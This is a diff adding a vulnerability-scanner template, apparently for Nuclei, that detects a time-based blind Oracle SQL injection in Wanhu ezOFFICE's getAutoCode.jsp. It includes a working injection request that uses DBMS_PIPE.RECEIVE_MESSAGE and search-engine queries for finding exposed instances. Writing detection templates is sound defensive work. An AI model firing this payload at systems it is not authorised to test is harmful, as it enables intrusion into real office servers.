@@ -1,0 +1,35 @@
+id: wanhu-ezoffice-getAutoCode-sqli
+
+info:
+  name: 万户 ezoffice getAutoCode.jsp - sqli
+  author: leadlife
+  severity: high
+  description: Detects an Oracle SQL injection vulnerability by exploiting timing-based blind SQL injection using DBMS_PIPE.RECEIVE_MESSAGE.
+  reference: 
+    - demo
+  metadata:
+    veified: true
+    max-request: 1
+    hunter-query: app.name="万户 Ezoffice OA"
+    fofa-query: app="万户网络-ezOFFICE"  
+  tags: wanhu,2024,sqli,oa,time,ezoffice
+
+http:
+  - raw:
+      - |
+        GET /defaultroot/login.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+      - |+
+        @timeout: 15s
+        GET /defaultroot/platform/custom/customizecenter/js/getAutoCode.jsp;.js?pageId=1&head=2%27+AND+6205%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2898%29%7C%7CCHR%2866%29%7C%7CCHR%2890%29%7C%7CCHR%28108%29%2C6%29--+YJdO&field=field_name&tabName=tfield HTTP/1.1
+        Host: {{Hostname}}
+
+    cookie-reuse: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - duration_2 >= 5 && duration_2 < 9
+          - contains(body_1,'defaultroot')
+        condition: and
